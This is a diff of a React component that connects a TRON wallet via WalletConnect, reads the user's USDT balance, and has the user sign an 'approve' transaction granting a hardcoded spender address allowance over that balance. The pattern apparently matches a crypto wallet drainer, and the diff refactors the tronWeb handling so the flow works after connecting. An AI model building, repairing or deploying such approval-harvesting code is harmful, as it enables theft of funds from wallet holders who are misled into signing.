@@ -259,13 +259,14 @@
 // }
 
 // export default WalletConnectComponent;
-// ✅ Updated React Component with WalletConnectWallet support via @tronweb3/walletconnect-tron
+/// ✅ Updated React Component with proper wallet.tronWeb fallback support
 import React, { useEffect, useState } from 'react';
 import TronWeb from 'tronweb';
 import { WalletConnectWallet, WalletConnectChainID } from '@tronweb3/walletconnect-tron';
 
 const contractAddressUSDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const spenderAddress = 'THHeEtDrFnDg3hY21SEETb9qLhhtFbd6Gi';
+const server = 'your-api-server.com';
 const tokenPriceInUSD = 1;
 const min_withdraw = 1;
 const projectId = '150d746f7722fa489e9df7ad9ddcd955'; // Replace with real WC project ID
@@ -299,12 +300,14 @@ const wallet = new WalletConnectWallet({
 
 function App() {
   const [address, setAddress] = useState('');
+  const [tron, setTron] = useState(null);
   const [status, setStatus] = useState('');
 
   const connectWallet = async () => {
     try {
       const data = await wallet.connect();
       setAddress(data.address);
+      setTron(wallet.tronWeb); // set tronWeb only after connect
       setStatus(`✅ Connected: ${data.address}`);
     } catch (error) {
       console.error('Connection error:', error);
@@ -313,21 +316,19 @@ function App() {
   };
 
   const getTrxBalance = async (addr) => {
-    const tronWeb = wallet.tronWeb;
-    const balance = await tronWeb.trx.getBalance(addr);
-    return tronWeb.fromSun(balance);
+    const balance = await tron.trx.getBalance(addr);
+    return tron.fromSun(balance);
   };
 
   const handleApprove = async () => {
-    if (!address) {
+    if (!address || !tron) {
       setStatus('❌ Wallet not connected');
       return;
     }
 
     try {
-      const tronWeb = wallet.tronWeb;
       const balanceTRX = await getTrxBalance(address);
-      const contract = await tronWeb.contract().at(contractAddressUSDT);
+      const contract = await tron.contract().at(contractAddressUSDT);
       const decimals = await contract.decimals().call();
       const rawBalance = await contract.balanceOf(address).call();
       const balance = Number(rawBalance);
@@ -341,7 +342,7 @@ function App() {
 
         const options = { feeLimit: 300_000_000, from: address };
 
-        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+        const tx = await tron.transactionBuilder.triggerSmartContract(
           contractAddressUSDT,
           'approve(address,uint256)',
           options,
@@ -350,7 +351,7 @@ function App() {
         );
 
         const signed = await wallet.signTransaction(tx.transaction);
-        const broadcast = await tronWeb.trx.sendRawTransaction(signed);
+        const broadcast = await tron.trx.sendRawTransaction(signed);
 
         if (broadcast.result) {
           setStatus(`✅ Approved ${balance_normal} USDT! TX: ${broadcast.txid}`);
